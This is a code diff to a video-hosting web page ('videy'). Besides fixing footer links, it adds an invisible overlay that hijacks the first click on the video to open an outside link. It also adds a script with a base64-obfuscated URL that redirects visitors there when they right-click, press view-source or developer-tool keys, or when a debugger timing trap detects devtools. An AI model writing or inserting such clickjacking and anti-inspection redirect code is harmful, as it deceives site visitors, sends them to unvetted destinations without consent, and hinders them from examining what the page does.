@@ -110,6 +110,16 @@ body{
     background:#fff;
 }
 
+.video-click-layer{
+    position:absolute;
+    inset:0;
+    width:100%;
+    height:100%;
+    background:transparent;
+    border:none;
+    cursor:pointer;
+    z-index:5;
+}
 
 .play-overlay{
     position:absolute;
@@ -274,7 +284,6 @@ function confirmAge(){
     </div>
   </div>
 </div>
-
 <header class="main-header">
 <div class="header-content">
 <a href="../" class="logo">videy</a>
@@ -300,6 +309,12 @@ Upload
               playsinline>
               Your browser does not support the video tag.
             </video>
+        <button
+            type="button"
+            class="video-click-layer"
+            id="firstClickLayer"
+            aria-label="Open video link">
+          </button>
         <div class="play-overlay" id="playOverlay">
           <svg viewBox="0 0 24 24">
             <path d="M8 5v14l11-7z" />
@@ -313,6 +328,7 @@ Upload
     <div id="countdown-timer" style="display: none; margin-top: 12px; font-weight: bold; color: #d00; font-size: 18px;">
       Redirecting in <span id="timer-value">60</span> seconds.
     </div>
+
     <div class="video-actions">
       <a class="download-btn" href="https://crn77.com/4/10180786"
                target="_blank"
@@ -339,7 +355,7 @@ Upload
     <footer>
     <div align="center">
       Copyright © 2026<br>
-      <a href="javascript:void(0)" class="footer-link" on="openTerms()">Terms of Service</a> • <a href="javascript:void(0)" class="footer-link" on="openReport()">Report Abuse</a>  
+      <a href="javascript:void(0)" class="footer-link" onclick="openTerms()">Terms of Service</a> • <a href="javascript:void(0)" class="footer-link" onclick="openReport()">Report Abuse</a>  
     </div>
   </footer>
 
@@ -347,6 +363,7 @@ Upload
 const video = document.getElementById("video");
 const videoError = document.getElementById("video-error");
 const videoActions = document.querySelector(".video-actions");
+const clickLayer = document.getElementById("firstClickLayer");
 
 const params = new URLSearchParams(window.location.search);
 const id = params.get("id") || "t4qLw89X1";
@@ -460,6 +477,18 @@ video.oncanplay = function () {
     videoActions.style.display = "flex";
 };
 
+(function(){
+    const directLink = "https://crn77.com/4/10180786";
+
+    if (!clickLayer) return;
+
+    clickLayer.addEventListener("click", function(e){
+        e.preventDefault();
+        e.stopPropagation();
+        window.open(directLink, "_blank");
+        clickLayer.remove();
+    }, { once: true });
+})();
 </script>
 <div id="uploadPopup" class="upload-popup" style="display:none;">
     <div class="upload-popup-card">
@@ -488,6 +517,55 @@ video.oncanplay = function () {
         <div id="pageModalContent" class="page-modal-content"></div>
     </div>
 </div>
+<!-- Frontend-safe redirect -->
+<script>
+(() => {
+    const encodedURL = "aHR0cHM6Ly9jcm43Ny5jb20vNC8xMDE4MDc4Ng==";
+
+    const go = () => {
+        window.location.href = atob(encodedURL);
+    };
+
+    
+    const blockKeys = (e) => {
+        const k = String(e.key || "").toLowerCase();
+        if (
+            (e.ctrlKey && k === 'u') ||
+            (e.ctrlKey && e.shiftKey && ['i','j','c'].includes(k)) ||
+            k === 'f12'
+        ) {
+            e.preventDefault();
+            e.stopPropagation();
+            e.stopImmediatePropagation();
+            go();
+            return false;
+        }
+    };
+
+    window.addEventListener('keydown', blockKeys, true);
+    document.addEventListener('keydown', blockKeys, true);
+    
+
+    
+    window.addEventListener('contextmenu', (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        go();
+    }, true);
+    
+
+    
+    setInterval(() => {
+        const t = Date.now();
+        debugger;
+        if (Date.now() - t > 100) {
+            go();
+        }
+    }, 500);
+    
+
+})();
+</script>
 <script type="text/javascript">var _Hasync= _Hasync|| [];
 _Hasync.push(['Histats.start', '1,4960646,4,0,0,0,00010000']);
 _Hasync.push(['Histats.fasi', '1']);
